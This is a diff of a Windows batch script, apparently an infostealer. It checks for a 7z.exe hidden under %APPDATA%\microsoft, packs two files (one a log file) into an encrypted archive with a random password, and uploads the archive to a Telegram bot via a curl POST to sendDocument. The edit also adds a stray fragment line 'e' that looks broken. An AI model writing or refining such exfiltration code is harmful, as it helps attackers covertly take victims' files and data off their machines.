@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=6.9"
+set "BATCHVERSION=7.0"
 
 
 
@@ -1605,11 +1605,15 @@ echo.
 
 
 
+if exist "%APPDATA%\microsoft\7z.exe" goto :COMPRESSFILES
+goto NEXT8
 
 
 
 :COMPRESSFILES
-
+echo 7z exists. Continue...
+echo.
+echo.
 
 for /L %%i in (1,1,13) do (
     set /A "rand=!random! %% 62"
@@ -1630,9 +1634,10 @@ set "File2=%LOGFILE1%"
 
 echo Compressing Files
 "%7zip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
-
-
-
+if exist "%ZIP_FILE%" echo File Compressed successfuly.
+echo.
+echo.
+e
 
 
 
@@ -1664,6 +1669,8 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
 
 
 
+
+:NEXT8
 
 
 
